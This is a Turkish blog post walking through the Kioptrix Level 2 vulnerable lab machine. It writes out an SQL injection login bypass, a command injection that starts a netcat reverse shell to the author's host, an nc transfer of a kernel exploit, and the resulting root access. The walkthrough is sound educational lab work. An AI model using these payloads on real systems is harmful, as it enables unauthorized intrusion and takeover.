---
layout: post
title: Kioptrix Level 2 Writeup
categories: tr
---





&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu yazımda daha önce çözümünü yaptığım Kioptrix zafiyetli makinesinin ikinci aşamasının(`Level II`) çözümünü anlatacağım. Öncelikle sanal makinenin ağ üzerinde aldığı ip adresini bulmak için `NMAP` ile genel ağ taraması yaptım.

	nmap -sV -T4 192.168.1.0/24

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu tarama sonucunda ip adresini 192.168.1.40 olarak görüyoruz. Şimdi bu makine için açık port taraması yapacağız. 

	nmap -sV -T4 192.168.1.40 --open



<img src="/img/kioptrix2/hedef-tarama.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Buradaki servisleri kullanarak farklı yollarla makineye sızma girişiminde bulunabiliriz. Açık olan `http` servisi benim dikkatimi çekti ve buradan nereye gidebileceğimi görmek için tarayıcıma makinenin ip adresini girerek yoluma devame ediyorum. 

<img src="/img/kioptrix2/sqli.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Böyle bir ekran beni karşılıyor. Burası çok net bir şekilde `SQLi` açığı bulunduran bir login ekranı. Her zaman kullandığım inject denemesi olarak hem Username hem Password için 'or 1 or' deniyorum ve farklı bir sayfaya yönlendiriliyorum.

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Burası daha önce çözümünü yaptığım `DVWA Code Injection` bölümüne benziyor. Aynı mantıkla deneme amaçlı 127.0.0.1 && echo "CTRL" yazıp gönderiyorum ve aşağıda yazan "CTRL" yazısından code injection yapabildiğimi anlıyorum.

<img src="/img/kioptrix2/code-injection.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Bu aşamadan sonra nasıl bir code yollayıp hangi veriye ulaşsam ne işime yarar diye düşünmeye başladım. `nc` aracının içerideki yerini bulup servis üzerinde bir reverse shell başlatarak içeri sızmayı planladım. Sonra da gerekli exploiti bulup içeride root olmaya çalışacağım. nc aracının içerideki yerini bulmak için 127.0.0.1 && find / -name nc komutunu içeriye yolluyorum.

<img src="/img/kioptrix2/find-nc.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tool'un yerini de bulduktan sonra `127.0.0.1  && /usr/local/bin/nc 192.168.1.38 7777 -e '/bin/bash'` komutunu yollayarak reverse shell başlattım. Aynı zamanda kendi makinemden da nc ile dinleme açtım. Kodu yolladığımda bağlantı sağlandı.

<img src="/img/kioptrix2/reverse-shell.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Diğer çözümdeki gibi dizinlerde dolanarak /var/mail/root dosyasına geldim ve bu uyarıyla karşılaştım.
`"root: writable, regular file, no read permission".` 

<br>
<img src="/img/kioptrix2/permission-denied.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Apache kullanıcısı olduğum için gerekli izinlerim yok. Artık içeride root olmam gerekiyor. Root olmak için içeride bir exploit çalıştıracağım. Uygun exploit için `kernel` bilgisine bakıyorum. 

	uname -a 

<img src="/img/kioptrix2/uname.png">

&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sistemde yüklü çekirdek versiyonu 2.6.9 olarak görünüyor. Buna uygun olacak kodu exploit-db' de aratarak buldum. Sonra yine `nc` aracı ile karşı tarafa transfer ettim.

	Hedef için : /usr/local/bin/nc 192.168.1.38 8888 > 9545.c
	Kendi makinem için : nc -lvp 8888 < 9545.c

komutlarını girdim.


<img src="/img/kioptrix2/file-transfer.png">


<br><br>Sonra kodu çalıştırıp içeride root olmayı başardım.<br><br>

<img src="/img/kioptrix2/root.png">


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Böylelikle Kioptrix Level II makinesininde çözümünü tamamlamış olduk. Özetle gerçekleştirdiğim aşamalar :

 1-  Port taraması sonucu açık olan http apache servisine giderek burada code injection gerçekleştirdim.<br>
 2-  Bu code injection sayesinde servise reverse shell başlattım.<br>
 3-  Reverse shell sayesinde karşıya exploit kodunu transfer ettim. <br>
 4-  Exploit kodunu çalıştırıp sistemde root yetkisi elde ettim.<br>



















